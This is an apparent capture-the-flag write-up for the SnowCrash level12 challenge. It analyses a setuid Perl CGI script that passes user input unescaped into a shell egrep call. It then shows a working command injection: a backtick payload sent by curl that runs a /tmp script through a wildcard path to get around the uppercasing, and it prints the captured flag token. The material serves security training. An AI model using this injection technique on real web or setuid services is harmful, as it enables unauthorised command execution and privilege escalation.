# level12

## Hint

We can see that there is a perl file named `level12.pl`.

First of all there is a `setuid` bit.

And surely this will be our target for the next exploit, just like in `level04`.

```shell-session
level12@SnowCrash:~$ ls -la level12.pl
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

## The script

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

First of all, we see it's doing some communicating with `localhost` on port `4646`.
And again, like on `level04` with a Common Gateway Interface.

We can see two subroutines: `t` and `n`. 

rom the function call at the bottom we can see that they're nested subroutines. 

Let's continue ...

### subroutine `n`

This subroutine looks like it is printing two strings.
- Either `".."` or `"."`
- It checks the first argument `$_[0]` and if it is equal to `1` returns `".."` and `"."` otherwise.

So basically it's just checking the return of that other subroutine.

### subroutine `t`

This one is harder.

We have two arguments : `$_[0]` and `$_[1]`.

They are assigned to a local variable:

`$_[0]` -> `$xx`
`$_[0]` -> `$nn`

Thus the local variable `$xx` is translated with `tr` operator to a capitalized version of the contents of that variable.

Then, some subsitution of whitespaces is done on it (thank to the  `s` operator) which will remove any whitespace from the string.

For exemple thoses two lines transform a string like:

> "This is a String !"

to

> "THISISASTRING!"

We know that we transform the first argument to a capitalized string without spaces.

The third variable that we can see in there is `@output`, which is an array assigned by

```
egrep "^$xx" /tmp/xd 2>&1
```

The `egrep` call will output the matching lines that begin with the transformed string `$xx` in a file located in `/tmp` named `xd`..

The main takeawat here is: **shell commands are unprotected and executed within a script with `suid` and `guid` bits set**

And as we have seen in several different exercises now: its vulnerable.

## exploit

Lets gather our current knowledge on the task at hand:
1. the script is executed with elevated priviledges
2. it executes unprotected shell commands
3. takes user input as does some modifications to it before sending it to the `in-script` shell command-line.

The only logical thing to do left for us is sending the right shell command to the `x` parameter in order for the script to call an executable of our own making and **print** the call to `getflag.`

## inject code

First, we can see that it is possible to make the script execute shell commands for us if we wrap them in between `backticks` because of the shell command expansion that allows us to have embedded code executed in priority (i.e **before** the call to `egrep`).

```shell-session
level12@SnowCrash:~$ ./level12.pl x="`getflag > /tmp/flag`"
Content-type: text/html

..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

We see that there is some content written to the `/tmp/flag` file.

Which means that we can make an `evil` shell executable and make it be called by the script as we give it a path as parameter `x`. 

But in order to do that, we need to take into account the modifications that the program does on our input.

Which means we cannot simply give a path to a file to execute because its directories will get capitalized by the call to the `tr` tool and the path may not contain whitespaces either because they get filtered out by `s`.

Meaning the two following examples are invalid injections:

```shell-session
level12@SnowCrash:~$ ./level12.pl x="getflag > /tmp/love"
Content-type: text/html

..level12@SnowCrash:~$ cat /tmp/love
cat: /tmp/love: No such file or directory
```
1. No `backticks` makes the string unparsable by the `in-script` shell command since it will be turned to `GETFLAG>/TMP/LOVE`. which is neither a valid command line nor a valid path.

```shell-session
le vel12@SnowCrash:~$ ./level12.pl x=`getflag > /tmp/love`
Content-type: text/html

..level12@SnowCrash:~$ cat /tmp/love
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
level12@SnowCrash:~$ ls -l /tmp/love
-rw-rw-r-- 1 level12 level12 89 May 18 17:09 /tmp/love
```

2. This command line will be evaluated in **OUR** shell, and the output of that commandline will be sent to the script and that's not our goal, we need acces to the rights that the script has.

This means that we need to query the script that is currently listening on the network at port `4646` and use **ITS** rights in order to call `getflag`. To do that, and as we did for `level04` we use curl and make a nice query that will do the rest of the work for us.

## Getflag

```shell-session
level12@SnowCrash:/tmp$ echo "getflag > /tmp/flag" > EVILSCRIPT
level12@SnowCrash:/tmp$ chmod 777 EVILSCRIPT
level12@SnowCrash:/tmp$ ls -l EVILSCRIPT
-rwxrwxrwx 1 level12 level12 20 May 18 17:21 EVILSCRIPT
level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x="`/*/EVILSCRIPT`"'
..level12@SnowCrash:/tmp$ cat flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
